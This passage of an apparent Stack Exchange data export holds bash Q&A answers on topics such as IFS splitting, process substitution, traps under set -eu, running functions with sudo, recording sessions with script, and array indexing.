<h3>Conclusions</h3>

<ul>
<li>Hyphens are non-standard. Stay away from them if you want cross-shell compatibility.</li>
<li>Use underscores instead of hyphens: underscores are accepted everywhere.</li>
</ul>
"
"Command substitution: splitting on newline but not space","39473","<bash><command-substitution>","31","<p>Looks like the canonical way to do this in <code>bash</code> is something like</p>

<pre><code>unset args
while IFS= read -r line; do 
    args+=(""$line"") 
done &lt; file

cmd ""${args[@]}""
</code></pre>

<p>or, if your version of bash has <code>mapfile</code>:</p>

<pre><code>mapfile -t args &lt; filename
cmd ""${args[@]}""
</code></pre>

<p>The only difference I can find between the mapfile and the while-read loop versus the one-liner</p>

<pre><code>(set -f; IFS=$'\n'; cmd $(&lt;file))
</code></pre>

<p>is that the former will convert a blank line to an empty argument, while the one-liner will ignore a blank line.  In this case the one-liner behavior is what I'd prefer anyway, so double bonus on it being compact.</p>

<p>I would use <code>IFS=$'\n' cmd $(&lt;file)</code> but it doesn't work, because <code>$(&lt;file)</code> is interpreted to form the command line before <code>IFS=$'\n'</code> takes effect.</p>

<p>Though it doesn't work in my case, I've now learned that a lot of tools support terminating lines with <code>null (\000)</code> instead of <code>newline (\n)</code> which does make a lot of this easier when dealing with, say, file names, which are common sources of these situations:</p>

<pre><code>find / -name '*.config' -print0 | xargs -0 md5
</code></pre>

<p>feeds a list of fully-qualified file names as arguments to md5 without any globbing or interpolating or whatever. That leads to the non-built-in solution</p>

<pre><code>tr ""\n"" ""\000"" &lt;file | xargs -0 cmd
</code></pre>

<p>although this, too, ignores empty lines, though it does capture lines that have only whitespace.</p>
"
"Which shell should I use - tcsh vs bash?","969","<linux><shell><bash><fedora><tcsh>","31","<p>After learning bash I find that tcsh is a bit of a step backwards. For instance what I could easily do in bash I'm finding it difficult to do in tcsh. <a href=""https://unix.stackexchange.com/questions/5111/operate-on-command-output-in-tcsh"">My question on tcsh</a>.  The Internet support and documentation is also much better for bash and very limited for tcsh.  The number of O'Reilly books on bash are great but I have found nothing similar for tcsh.</p>
"
"How to specify a custom autocomplete for specific commands?","1800","<bash><autocomplete>","31","<p>The easiest way of doing this is to include a shell script in <code>/etc/bash_completion.d/</code>.  The basic structure of this file is a simple function that performs the completion and then invocation of <code>complete</code> which is a bash builtin.  Rather than go into detail on how to use <code>complete</code>, I suggest you read <a href=""https://debian-administration.org/article/316/An_introduction_to_bash_completion_part_1"" rel=""noreferrer"">An Introduction to Bash Completion</a>.  Part 1 covers the basics and Part 2 gets into how you would go about writing a completion script.</p>

<p>A denser description of bash completion can be found in the ""Programmable Completion"" section of <code>man bash</code> (you can type ""/Programmable Completion"" and then press 'n' a few times to get there quickly.  Or, if you are feeling luck, ""g 2140 RETURN"").</p>
"
"What's going to be new in bash 5","478590","<bash><upgrade>","31","<p>The changes made to <code>bash</code> between release 4.4 and 5.0 (released 2019-01-07) may be found in the <code>NEWS</code> file in the <code>bash</code> source distribution.</p>

<p><a href=""http://git.savannah.gnu.org/cgit/bash.git/tree/NEWS?h=bash-5.0"" rel=""noreferrer"">Here is a link to it</a> (the changes are too numerous to list here).</p>
"
"How can I time a pipe?","364156","<bash><shell><pipe><time>","31","<p>It <em>is</em> working.</p>

<p>The different parts of a pipeline are executed concurrently.  The only thing that synchronises/serialises the processes in the pipeline is IO, i.e. one process writing to the next process in the pipeline and the next process reading what the first one writes. Apart from that, they are executing <em>independently</em> of each other.</p>

<p>Since there is no reading or writing happening between the processes in your pipeline, the time take to execute the pipeline is that of the longest <code>sleep</code> call.</p>

<p>You might as well have written</p>

<pre><code>time ( foo.sh &amp; bar.sh &amp;; wait )
</code></pre>

<hr>

<p>Terdon posted <a href=""http://chat.stackexchange.com/transcript/message/37299607#37299607"">a couple of slightly modified example scripts in the chat</a>:</p>

<pre><code>#!/bin/sh
# This is ""foo.sh""
echo 1; sleep 1
echo 2; sleep 1
echo 3; sleep 1
echo 4
</code></pre>

<p>and</p>

<pre><code>#!/bin/sh
# This is ""bar.sh""
sleep 2
while read line; do
  echo ""LL $line""
done
sleep 1
</code></pre>

<p>The query was ""why does <code>time ( sh foo.sh | sh bar.sh )</code> return 4 seconds rather than 3+3 = 6 seconds?""</p>

<p>To see what's happening, including the approximate time each command is executed, one may do this (the output contains my annotations):</p>

<pre><code>$ time ( env PS4='$SECONDS foo: ' sh -x foo.sh | PS4='$SECONDS bar: ' sh -x bar.sh )
0 bar: sleep 2
0 foo: echo 1     ; The output is buffered
0 foo: sleep 1
1 foo: echo 2     ; The output is buffered
1 foo: sleep 1
2 bar: read line  ; ""bar"" wakes up and reads the two first echoes
2 bar: echo LL 1
LL 1
2 bar: read line
2 bar: echo LL 2
LL 2
2 bar: read line  ; ""bar"" waits for more
2 foo: echo 3     ; ""foo"" wakes up from its second sleep
2 bar: echo LL 3
LL 3
2 bar: read line
2 foo: sleep 1
3 foo: echo 4     ; ""foo"" does the last echo and exits
3 bar: echo LL 4
LL 4
3 bar: read line  ; ""bar"" fails to read more
3 bar: sleep 1    ; ... and goes to sleep for one second

real    0m4.14s
user    0m0.00s
sys     0m0.10s
</code></pre>

<p>So, to conclude, the pipeline takes 4 seconds, not 6, due to the buffering of the output of the first two calls to <code>echo</code> in <code>foo.sh</code>.</p>
"
"Why does BASH process substitution not work with some commands?","164107","<linux><bash><shell><command-line><process-substitution>","31","<p>Process substitution results in a special file (like <code>/dev/fd/63</code> in your example) that behaves like the read end of a named pipe. This file can be opened and read, but not written, not seeked.</p>

<p>Commands that treat their arguments as pure streams work while commands that expect to seek in files they are given (or write to them) won't work. The kind of command that will work is what is usually considered a filter: <code>cat</code>, <code>grep</code>, <code>sed</code>, <code>gzip</code>, <code>awk</code>, etc... An example of a command that won't work is an editor like <code>vi</code> or a file operation like <code>mv</code>.</p>

<p><code>gcc</code> wants to be able to perform random access on its input files to detect what language they are written in. If you instead give <code>gcc</code> a hint about the input file's language, it's happy to stream the file:</p>

<pre><code>gcc -x c &lt;(echo 'int main(){return 0;}')
</code></pre>

<p>The simpler more straightforward form without process substitution also works:</p>

<pre><code>echo 'int main(){return 0;}' | gcc -x c -
</code></pre>

<p>Note that this is not specific to <code>bash</code>. All shells that support process substitution behave the same way.</p>
"
"How to get last part of http link in Bash?","325490","<bash><shell-script><awk><cut>","31","<p>Using <code>awk</code> for this would work, but it's kind of deer hunting with a howitzer.  If you already have your URL bare, it's pretty simple to do what you want if you put it into a shell variable and use <code>bash</code>'s built-in parameter substitution:</p>

<pre><code>$ myurl='http://www.example.com/long/path/to/example/file.ext'
$ echo ${myurl##*/}
file.ext
</code></pre>

<p>The way this works is by removing a prefix that greedily matches '*/', which is what the <code>##</code> operator does:</p>

<pre><code>${haystack##needle} # removes any matching 'needle' from the
                    # beginning of the variable 'haystack'
</code></pre>
"
"How do I get the total size of everything in a directory in one line?","239479","<bash><shell><directory><ls><disk-usage>","31","<p>Add the <code>--max-depth</code> parameter with a value of 0:</p>

<pre><code>du -h --max-depth=0 /root/test
</code></pre>

<p>Or, use the <code>-s</code> (summary) option:</p>

<pre><code>du -sh /root/test
</code></pre>

<p>Either of those should give you what you want. For future reference, <code>man du</code> is very helpful.</p>
"
"Correct behavior of EXIT and ERR traps when using `set -eu`","208112","<bash><shell-script><scripting><parameter><trap>","31","<p>From <code>man bash</code>:</p>

<ul>
<li><code>set -u</code>
<ul>
<li>Treat unset variables and parameters other than the special parameters <code>""@""</code> and <code>""*""</code> as an error when performing parameter expansion. If expansion is attempted on an unset variable or parameter, the shell prints an error message, and, if not <code>-i</code>nteractive, exits with a nonzero status.</li>
</ul></li>
</ul>

<p>POSIX states that, in the event of an <em>expansion error</em>, a non-interactive shell <em>shall exit</em> when the expansion is associated with either a shell special builtin <em>(which is a distinction <code>bash</code> regularly ignores anyway, and so maybe is irrelevant)</em> or any other utility besides.</p>

<ul>
<li><a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_08_01"">Consequences of Shell Errors</a>:
<ul>
<li>An <em>expansion error</em> is one that occurs when the shell expansions defined in <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06"">Word Expansions</a> are carried out <em>(for example, <code>""${x!y}""</code>, because <code>!</code> is not a valid operator)</em>; an implementation <em>may</em> treat these as syntax errors if it is able to detect them during tokenization, rather than during expansion.</li>
<li>[A]n interactive shell shall write a diagnostic message to standard error without exiting.</li>
</ul></li>
</ul>

<p>Also from <code>man bash</code>:</p>

<ul>
<li><code>trap ... ERR</code>
<ul>
<li>If a sigspec is <em>ERR</em>, the command <em>arg</em> is executed whenever a pipeline <em>(which may consist of a single simple command)</em>, a list, or a compound command returns a non-zero exit status, subject to the following  conditions:
<ul>
<li>The <em>ERR</em> trap is not executed if the failed command is part of the command list immediately following a <code>while</code> or <code>until</code> keyword...</li>
<li>...part of the test in an <code>if</code> statement...</li>
<li>...part of a command executed in a <code>&amp;&amp;</code> or <code>||</code> list except the command following the final <code>&amp;&amp;</code> or <code>||</code>...</li>
<li>...any command in a pipeline but the last...</li>
<li>...or if the command's return value is being inverted using <code>!</code>.</li>
</ul></li>
<li>These  are  the  same conditions obeyed by the <em>errexit</em> <code>-e</code> option.</li>
</ul></li>
</ul>

<p>Note above that the <em>ERR</em> trap is all about the evaluation of some <em>other</em> command's return. But when an <em>expansion error</em> occurs, there is no command run to return anything. In your example, <code>echo</code> <em>never happens</em> - because while the shell evaluates and expands its arguments it encounters an <code>-u</code>nset variable, which has been specified by explicit shell option to cause an immediate exit from the current, scripted shell.</p>

<p>And so the <em>EXIT</em> trap, if any, is executed, and the shell exits with a diagnostic message and exit status other than 0 - exactly as it should do.</p>

<p>As for the <em>rc: 0</em> thing, I expect that is a version specific bug of some kind - probably to do with the two triggers for the <em>EXIT</em> occurring at the same time and the one getting the other's exit code <em>(which should not occur)</em>. And anyway, with an up-to-date <code>bash</code> binary as installed by <code>pacman</code>:</p>

<pre><code>bash &lt;&lt;\IN
    printf ""shell options:\t$-\n""
    trap 'echo ""EXIT (rc: $?)""' EXIT
    set -eu
    echo ${UNSET_VAR}
IN
</code></pre>

<p>I added the first line so you can see that the shell's conditions are those of a scripted shell - it is <em>not</em> interactive. The output is:</p>

<pre><code>shell options:  hB
bash: line 4: UNSET_VAR: unbound variable
EXIT (rc: 1)
</code></pre>

<p>Here are some relevant notes from <a href=""https://tiswww.case.edu/php/chet/bash/CHANGES"">recent changelogs</a>:</p>

<ul>
<li>Fixed a bug that caused asynchronous commands to not set <code>$?</code> correctly.</li>
<li>Fixed a bug that caused error messages generated by <em>expansion errors</em> in
<code>for</code> commands to have the wrong line number.</li>
<li>Fixed a bug that caused <em>SIGINT</em> and <em>SIGQUIT</em> to not be <code>trap</code>pable in asynchronous subshell commands.</li>
<li>Fixed a problem with interrupt handling that caused a second and subsequent <em>SIGINT</em> to be ignored by interactive shells.</li>
<li>The shell no longer blocks receipt of signals while running <code>trap</code> handlers for those signals, and allows <em>most</em> <code>trap</code> handlers to be run recursively
<em>(running <code>trap</code> handlers while a <code>trap</code> handler is executing)</em>.</li>
</ul>

<p>I think it is either the last or the first that is most relevant - or possibly a combination of the two. A <em><code>trap</code> handler</em> is by its very nature <em>asynchronous</em> because its whole job is to wait for and handle <em>asynchronous signals</em>. And you trigger two simultaneously with <code>-eu</code> and <code>$UNSET_VAR</code>.</p>

<p>And so maybe you should just update, but if you like yourself, you'll do it with a different shell altogether. </p>
"
"reason for exec in wrapper scripts","279024","<bash><shell-script><shell><scripting><exec>","31","<p>Using <code>exec</code> makes the wrapper more transparent, i.e. it makes it less likely that the user or application that calls the script needs to be aware that it's a relay that in turns launches the “real” program.</p>

<p>In particular, if the caller wants to kill the program, they'll just kill the process they just launched. If the wrapper script runs a child process, the caller would need to know that they should find out the child of the wrapper and kill that instead. The wrapper script could set a trap to relay some signals, but that wouldn't work with SIGSTOP or SIGKILL which can't be caught.</p>

<p>Calling <code>exec</code> also saves a bit of memory (and other resources such as PIDs etc.) since it there's no need to keep an extra shell around with nothing left to do.</p>

<p>If there are multiple wrappers, the problems add up (difficulty in finding the right process to kill, memory overhead, etc.).</p>

<p>Some shells (e.g. the Korn shell) automatically detect when a command is the last one and there's no active trap and put an implicit <code>exec</code>, but not all do (e.g. not bash).</p>
"
"What's the equivalent to && when writing a bash script?","63480","<bash><centos><scripting>","31","<p>You can do it like this: </p>

<pre><code>#!/bin/sh
ls -lh &amp;&amp;
    # This is a comment
    echo 'Wicked, it works!'
</code></pre>

<p>I hope I understood what you asked correctly. </p>
"
"What is the purpose of delayed suspend (Ctrl-Y) in Bash?","303605","<bash><signals><job-control><jobs>","31","<p>From the <a href=""http://minnie.tuhs.org/cgi-bin/utree.pl?file=4BSD/usr/man/cat1/csh.1"">4BSD manual for csh</a>:</p>

<blockquote>
  <p>A <code>^Z</code> takes effect immediately and is like an interrupt in that pending output and unread input are discarded when it is typed.  There is another special key <code>^Y</code> which does not generate a STOP signal until a program attempts to <em>read</em>(2) it.  This can usefully be typed ahead when you have prepared some commands for a job which you wish to stop after it has read them.</p>
</blockquote>

<p>So, the purpose is to type multiple inputs while the first one is being processed, and have the job stop after they are done.</p>
"
"Do functions run as subprocesses in Bash?","305358","<bash><process><function>","31","<p>The Advanced Bash-Scripting Guide is not always reliable and its example scripts contain out-dated practices such as using the <a href=""https://unix.stackexchange.com/questions/126927/have-backticks-i-e-cmd-in-sh-shells-been-deprecated#link-post-126928"">effectively deprecated</a> backticks for command substitution, i.e., <code>`command`</code> rather than <code>$(command)</code>.</p>

<p>In this particular case, it’s blatantly incorrect.</p>

<p>The section on <a href=""https://www.gnu.org/software/bash/manual/html_node/Shell-Functions.html#Shell-Functions"">Shell Functions</a> in the (canonical) Bash manual definitively states that</p>

<blockquote>
  <p>Shell functions are executed in the current shell context; no new process is created to interpret them.</p>
</blockquote>
"
"Is there a way to refer to multiple files in a directory without retyping the whole path?","76821","<bash><arguments>","31","<p>You're close:</p>

<pre><code>rm /some/path/{file1,file2}
</code></pre>

<p>or even</p>

<pre><code>rm /some/path/file{1,2}
</code></pre>

<p>Related, and supported by other shells, is a pattern like</p>

<pre><code>rm /some/path/file[12]
</code></pre>

<p>The first two are expanded to two explicit file name arguments; the third is a pattern against which all files in <code>/some/path</code> are matched.</p>
"
"Executing a Bash Script Function with Sudo","269078","<bash><sudo><function>","31","<p>I will admit that there's no simple, intuitive way to do this, and this is a bit hackey. But, you can do it like this:</p>

<pre><code>function hello()
{
    echo ""Hello!""
}

# Test that it works.
hello

FUNC=$(declare -f hello)
sudo bash -c ""$FUNC; hello""
</code></pre>

<p>Or more simply:</p>

<pre><code>sudo bash -c ""$(declare -f hello); hello""
</code></pre>

<p>It works for me:</p>

<pre><code>$ bash --version
GNU bash, version 4.3.42(1)-release (x86_64-apple-darwin14.5.0)
$ hello
Hello!
$
$ FUNC=$(declare -f hello)
$ sudo bash -c ""$FUNC; hello""
Hello!
</code></pre>

<p>Basically, <code>declare -f</code> will return the contents of the function, which you then pass to <code>bash -c</code> inline.</p>

<p>If you want to export all functions from the outer instance of bash, change <code>FUNC=$(declare -f hello)</code> to <code>FUNC=$(declare -f)</code>.</p>

<p><strong>Edit</strong></p>

<p>To address the comments about quoting, see this example:</p>

<pre><code>$ hello()
&gt; {
&gt; echo ""This 'is a' test.""
&gt; }
$ declare -f hello
hello ()
{
    echo ""This 'is a' test.""
}
$ FUNC=$(declare -f hello)
$ sudo bash -c ""$FUNC; hello""
Password:
This 'is a' test.
</code></pre>
"
"How to debug and fix slow autocomplete in bash?","70885","<bash><autocomplete>","31","<p>I don't know about fixing — there are all kinds of things that could go cause delays. But I can offer a few tips to investigate.</p>

<p>Just as a guess, maybe there's a directory somewhere in a search path (<code>$PATH</code>, or some place where bash looks for completion data) that's on a filesystem which is slow to respond. Usually it's remote filesystems that are slow, but it could also be a failing hard disk, a hung FUSE driver, etc.</p>

<p>The first step to investigate is to run <code>set -x</code> to get a trace of the commands that the shell executes to generate the completions. Watch where it pauses.</p>

<p>If that doesn't give enough information, bring in the big guns. Note the shell's process ID (<code>echo $$</code>). In another terminal, run <code>strace -f -s9999 -p$$</code> (or the equivalent of <a href=""http://en.wikipedia.org/wiki/Strace"">strace</a> if running on another unix flavor). Strace lists the system calls performed by the process. See if it seems to be accessing files that it shouldn't, or if access to some files is slow. Adding the option <code>-T</code> to the <code>strace</code> command line makes it show the time spent in each system call.</p>
"
"bash directory shortcuts","1469","<bash>","31","<p>The way I used to do this is to create a directory that contains symlinks to the directories you want shortcuts do, and add that directory to your CDPATH. CDPATH controls where <code>cd</code> will search when you switch directories, so if that directory of symlinks is in your CDPATH you can <code>cd</code> to any of the symlinked directories instantly:</p>

<pre><code>mkdir ~/symlinks
ln -s /usr/bin ~/symlinks/b
export CDPATH=~/symlinks
cd b   # Switches to /usr/bin
</code></pre>

<p>The downside of course is it won't work if there's a directory in your current directory named ""b"" -- that takes precedence over the CDPATH</p>

<hr>

<p>I normally dislike answers that say ""first you need to switch shells"", but this <em>exact</em> feature exists in <a href=""http://www.zsh.org/"">ZSH</a>, if you're willing to use that instead; it's called <strong>named directories</strong>. You export a variable <code>foo</code>, and when you refer to <code>~foo</code> it resolves to the value of <code>$foo</code>. This is especially convenient because it works in commands besides <code>cd</code>:</p>

<pre><code>echo hi &gt; /tmp/test
export t=/tmp
cat ~t/test   # Outputs ""hi""
</code></pre>
"
"Bash regex capture group","251013","<bash><regular-expression>","31","<p>It's a shame that you can't do global matching in bash. You can do this:</p>

<pre><code>global_rematch() { 
    local s=$1 regex=$2 
    while [[ $s =~ $regex ]]; do 
        echo ""${BASH_REMATCH[1]}""
        s=${s#*""${BASH_REMATCH[1]}""}
    done
}
global_rematch ""$mystring1"" ""$regex"" 
</code></pre>



<pre><code>1BBBBBB
2AAAAAAA
</code></pre>

<p>This works by chopping the matched prefix off the string so the next part can be matched. It destroys the string, but in the function it's a local variable, so who cares.</p>

<p>I would actually use that function to populate an array:</p>

<pre><code>$ mapfile -t matches &lt; &lt;( global_rematch ""$mystring1"" ""$regex"" )
$ printf ""%s\n"" ""${matches[@]}""
1BBBBBB
2AAAAAAA
</code></pre>
"
"How to check if $PWD is a subdirectory of a given path","6435","<bash><shell><directory><string>","30","<p>If you want to reliably test whether a directory is a subdirectory of another, you'll need more than just a string prefix check.  Gilles' answer describes in detail how to do this test properly.</p>

<p>But if you do want a simple string prefix check (maybe you've already normalized your paths?), this is a good one:</p>

<pre><code>test ""${PWD##/home/}"" != ""${PWD}""
</code></pre>

<p>If <code>$PWD</code> starts with ""/home/"", it gets stripped off in the left side, which means it won't match the right side, so ""!="" returns true.</p>
"
"How to do a continous 'wc -l' with gnu texttools?","65315","<bash><shell><text-processing><logs><tail>","30","<p>Maybe:</p>

<pre><code>tail -n +1 -f file | awk '{printf ""\r%lu"", NR}'
</code></pre>

<p>Beware that it would output a number for every line of input (though overriding the previous value if sent to a  terminal).</p>

<p>Or you can implement the <code>tail -f</code> by hand in shell:</p>

<pre><code>n=0
while :; do 
  n=$(($n + $(wc -l)))
  printf '\r%s' ""$n""
  sleep 1
done &lt; file
</code></pre>

<p>(note that it runs up to one <code>wc</code> and one <code>sleep</code> command per second which not all shells have built in. With <code>ksh93</code> while <code>sleep</code> is builtin, to get a built in <code>wc</code> (at least on Debian), you need to add <code>/opt/ast/bin</code> at the front of <code>$PATH</code> (regardless of whether  that directory exists or not) or use <code>command /opt/ast/bin/wc</code> (don't ask...)).</p>

<p>You could use <code>pv</code>, as in:</p>

<pre><code>tail -n +1 -f file | pv -bl &gt; /dev/null
</code></pre>

<p>But beware that it adds <code>k</code>, <code>M</code>... suffixes when the number is over 1000 (and <a href=""/q/183358"">there doesn't seem to be a way around that</a>).</p>
"
"Bash throws error, line 8: $1: unbound variable","463034","<bash><shell-script><scripting>","30","<p><code>set -u</code> will abort exactly as you describe if you reference a variable which has not been set.  You are invoking your script with no arguments, so <code>get_percent</code> is being invoked with no arguments, causing <code>$1</code> to be unset.</p>

<p>Either check for this before invoking your function, or use default expansions (<code>${1-default}</code> will expand to <code>default</code> if not already set to something else).</p>
"
"realpath command not found","101080","<linux><bash><debian>","30","<p>Is realpath a actual command or a script? I would check to see where it is coming from.</p>

<pre><code>$ type -a realpath
</code></pre>

<p>I'm not familiar with this tool, and so it's likely not part of your normal distribution, perhaps it's installed in a non-standard location which isn't present on Bash's <code>$PATH</code> but is within your login environment's <code>$PATH</code>.</p>

<p>In any event, the above <code>type</code> command will show you where the command is coming from, at which point you can alter the method you're calling it in your script like so:</p>

<pre><code>echo $(/path/to/realpath test.sh)
</code></pre>

<p>Or amend your script's <code>$PATH</code> so that it also includes this non-standard location.</p>

<h3>Functions in the shell</h3>

<p>Much of your environment does not get called when you invoke a shell script. If you think about this, this makes a lot of sense, since you generally don't want scripts to have all the additional baggage that a user's environment may have.</p>

<p>You can either determine which source file is providing this function and either source it, or simply instruct Bash to incorporate your login environment.</p>

<pre><code>#!/bin/bash -l
echo $(realpath ""$1"")
</code></pre>
"
"Storing output of command in shell variable","4569","<command-line><bash><scripting><shell-script><coreutils>","30","<p>You'll want to modify your assignment to read:</p>

<pre><code>var4=""$(echo ztemp.xml | cut -f1 -d '.')""
</code></pre>

<p>The <code>$(…)</code> construct is known as <a href=""http://en.wikipedia.org/wiki/Command_substitution"">command susbtitution</a>.</p>
"
"How to automatically record all your terminal sessions with script utility","25639","<bash><terminal><scripting><konsole>","30","<p>If someone wants to record their terminal sessions automatically--including SSH sessions(!)--using the <code>script</code> utility, here is how.</p>

<p>Add the following line at the end of <code>.bashrc</code> in your home directory, or otherwise <code>/etc/bash.bashrc</code> if you only want to record all users' sessions. We test for shell's parent process not being <code>script</code> and then run <code>script</code>.</p>

<p>For Linux:</p>

<pre><code>test ""$(ps -ocommand= -p $PPID | awk '{print $1}')"" == 'script' || (script -f $HOME/$(date +""%d-%b-%y_%H-%M-%S"")_shell.log)
</code></pre>

<p>For BSD and macOS, change <code>script -f</code> to <code>script -F</code>:</p>

<pre><code>test ""$(ps -ocommand= -p $PPID | awk '{print $1}')"" == 'script' || (script -F $HOME/$(date +""%d-%b-%y_%H-%M-%S"")_shell.log)
</code></pre>

<p>That's all!</p>

<p>Now when you open a new terminal you'll see:</p>

<pre><code>Script started, file is /home/username/file_name.log
</code></pre>

<p><code>script</code> will write your sessions to a file in your home directory naming them something like <code>30-Nov-11_00-11-12_shell.log</code> as a result.</p>

<p>More customization:</p>

<ul>
<li>You can append your sessions to one large file rather than creating a new one for every session with <code>script -a /path/to/single_log_file</code></li>
<li>You can adjust where the files are written to by changing the path after <code>script -f</code> (Linux) or <code>script -F</code> (BSD and macOS)</li>
</ul>

<p>This answer assumes that you have <code>script</code> installed, of course. On Debian-based distributions, <code>script</code> is part of the <code>bsdutils</code> package.</p>
"
"How to use defined function with xargs","158564","<bash><xargs><function>","30","<p>Try exporting function, then calling it in a subshell:</p>

<pre><code>showword() {
  echo $1
}

export -f showword
echo This is a sample message | xargs -d' ' -t -n1 -P2 bash -c 'showword ""$@""' _
</code></pre>
"
"Invert boolean variable","24500","<bash><scripting>","30","<p>There are two errors in your script. The first is that you need a space between <code>!</code> and <code>$flag</code>, otherwise the shell looks for a command called <code>!$flag</code>. The second error is that <code>-eq</code> is for integer comparisons, but you're using it on a string. Depending on your shell, either you'll see an error message and the loop will continue forever because the condition <code>[ ""$x"" -eq ""true"" ]</code> cannot be true, or every non-integer value will be treated as 0 and the loop will exit if you enter any string (including <code>false</code>) other than a number different from 0.</p>

<p>While <code>! $flag</code> is correct, it's a bad idea to treat a string as a command. It would work, but it would be very sensitive to changes in your script, since you'd need to make sure that <code>$flag</code> can never be anything but <code>true</code> or <code>false</code>. It would be better to use a string comparison here, like in the test below.</p>

<pre><code>flag=false
while [ ""$flag"" != ""true"" ]
do
   read x
   if [ ""$x"" = ""true"" ]
   then
     flag=true
   fi
   echo ""${x} : ${flag}""
done
</code></pre>

<p>There's probably a better way to express the logic you're after. For example, you could make an infinite loop and break it when you detect the termination condition.</p>

<pre><code>while true; do
  read -r x
  if [ ""$x"" = ""true"" ]; then break; fi
  echo ""$x: false""
done
</code></pre>
"
"ctrl c vs. ctrl z with foreground job","135077","<bash><shell><signals><job-control>","30","<p>I think you may be confused about the job control notation. Notably ""Stopped"" means that a job is still alive but that its ability to process anything has been held (it is not given any time on the CPU to process anything). This is effectively a ""Pause"" or ""Suspended"" state, although that is not the correct technical term.</p>

<ul>
<li><p><kbd>Ctrl</kbd><kbd>C</kbd> does not ""stop"" a job, it cancels or kills it. Technically it causes an interrupt signal to be sent to the program telling it to abort what it is doing and exit immediately. Some programs will hear this signal and do some emergency clean up work on themselves before exiting. Others will not respond to the signal and are subsequently just aborted.</p></li>
<li><p><kbd>Ctrl</kbd><kbd>Z</kbd>, on the other hand, ""stops"" a job. Again this is done with a signal, but this time it is a 'stop' instead of an 'interrupt' signal. This effectively puts it on hold and returns control to the shell, but does not actually kill the job. If you would like such a job to keep running, you can then issue a <code>bg</code> command to send the last stopped job to the background. It will then continue running as a background job as if you had run it with <code>&amp;</code> in the first place. You may also use <code>fg</code> to resume the last stopped job in the foreground (allowing it to continue where it left off, and allowing you to interact with it again).</p></li>
</ul>
"
"How can I detect if I'm in a subshell?","524506","<bash><shell><exit><subshell>","30","<p>In bash, you can compare <code>$BASHPID</code> to <code>$$</code></p>

<pre><code>$ ( if [ ""$$"" -eq ""$BASHPID"" ]; then echo not subshell; else echo subshell; fi )
subshell
$   if [ ""$$"" -eq ""$BASHPID"" ]; then echo not subshell; else echo subshell; fi
not subshell
</code></pre>

<p>If you're not in bash, <code>$$</code> should remain the same in a subshell, so you'd need some other way of getting your actual process ID.</p>

<p>One way to get your actual pid is <code>sh -c 'echo $PPID'</code>. If you just put that in a plain <code>( … )</code> it may appear not to work, as your shell has optimized away the fork. Try extra no-op commands <code>( : ; sh -c 'echo $PPID'; : )</code> to make it think the subshell is too complicated to optimize away. Credit goes to <a href=""https://stackoverflow.com/a/20726041/27727"">John1024 on Stack Overflow</a> for that approach.</p>
"
"Does redirecting output to a file apply a lock on the file?","42544","<bash><shell><io-redirection><lock>","30","<p>Since you're using <code>&gt;&gt;</code>, which means append, each line of output from each instance will be appended in the order it occurred.</p>

<p>If your script output prints <code>1\n</code> through <code>5\n</code> with a one second delay between each and instance two is started 2.5 seconds later you'll get this:</p>

<pre><code>1
2
1
3
2
4
3
5
4
5
</code></pre>

<p>So to answer your question: No.</p>
"
"Is there something wrong with my script or is Bash much slower than Python?","303157","<bash><python3>","30","<p>This is a known bug in bash; see the man page and search for ""BUGS"":</p>

<blockquote>
<pre><code>BUGS
       It's too big and too slow.
</code></pre>
</blockquote>

<p>;)</p>

<hr>

<p>For an excellent primer on the conceptual differences between shell scripting and other programming languages, I highly recommend reading:</p>

<ul>
<li><a href=""https://unix.stackexchange.com/q/169716/135943"">Why is using a shell loop to process text considered bad practice?</a></li>
</ul>

<p>The most pertinent excerpts:</p>

<blockquote>
  <p>Shells are a higher level language. One may say it's not even a language. They're before all command line interpreters. The job is done by those commands you run and the shell is only meant to orchestrate them.</p>
  
  <p>...</p>
  
  <p>IOW, in shells, especially to process text, you invoke as few utilities as possible and have them cooperate to the task, not run thousands of tools in sequence waiting for each one to start, run, clean up before running the next one.</p>
  
  <p>...</p>
  
  <p>As said earlier, running one command has a cost. A huge cost if that command is not builtin, but even if they are builtin, the cost is big.</p>
  
  <p>And shells have not been designed to run like that, they have no pretension to being performant programming languages. They are not, they're just command line interpreters. So, little optimisation has been done on this front.</p>
</blockquote>

<hr>

<p>Don't use big loops in shell scripting.</p>
"
"Accessing array index variable from bash shell script loop?","278502","<bash><shell><shell-script>","30","<p>You can do this using <em>List of array keys</em>. From the <code>bash</code> man page:</p>

<blockquote>
  <p><code>${!name[@]}</code><br>
  <code>${!name[*]}</code></p>
  
  <p><strong>List of array keys</strong>.  If name is an array variable, expands to the list of array indices (keys) assigned in  name.  If name is not an array, expands to <code>0</code> if name is set and null otherwise.  When <code>@</code> is used and the expansion appears within double quotes, each key expands to a separate word.</p>
</blockquote>

<p>For your example:</p>

<pre><code>#!/bin/bash
AR=('foo' 'bar' 'baz' 'bat')
for i in ""${!AR[@]}""; do
  printf '${AR[%s]}=%s\n' ""$i"" ""${AR[i]}""
done
</code></pre>

<p>This results in:</p>

<pre><code>${AR[0]}=foo
${AR[1]}=bar
${AR[2]}=baz
${AR[3]}=bat
</code></pre>

<p>Note that this also work for non-successive indexes:</p>

<pre><code>#!/bin/bash
AR=([3]='foo' [5]='bar' [25]='baz' [7]='bat')
for i in ""${!AR[@]}""; do
  printf '${AR[%s]}=%s\n' ""$i"" ""${AR[i]}""
done
</code></pre>

<p>This results in:</p>

<pre><code>${AR[3]}=foo
${AR[5]}=bar
${AR[7]}=bat
${AR[25]}=baz
</code></pre>
"
"New tmux sessions do not source bashrc file","320465","<bash><tmux>","30","<p>As far as I know, by default <code>tmux</code> runs a login shell. When <code>bash</code> is invoked as an interactive login shell, it looks for <code>~/.bash_profile</code>, <code>~/.bash_login</code>, and <code>~/.profile</code>. So you have to put <code>source ~/.bashrc</code> in one of those files.</p>

<p>Another way to solve this issue is to put in your file <code>.tmux.conf</code> the line: </p>

<pre><code>set-option -g default-shell ""/bin/bash""
</code></pre>
"
"How do I set permissions recursively on a dir (with ACL enabled)?","98007","<linux><bash><permissions><acl>","30","<p><code>setfacl</code> has a <em>recursive</em> option (<code>-R</code>) just like <code>chmod</code>:</p>

<blockquote>
<pre><code>  -R, --recursive
      Apply operations to all files and directories recursively. This
      option cannot be mixed with `--restore'.
</code></pre>
</blockquote>

<p>it also allows for the use of the capital-x <code>X</code> permission, which means:</p>

<blockquote>
<pre><code>  execute only if the file is a directory or already has
  execute permission for some user (X)
</code></pre>
</blockquote>

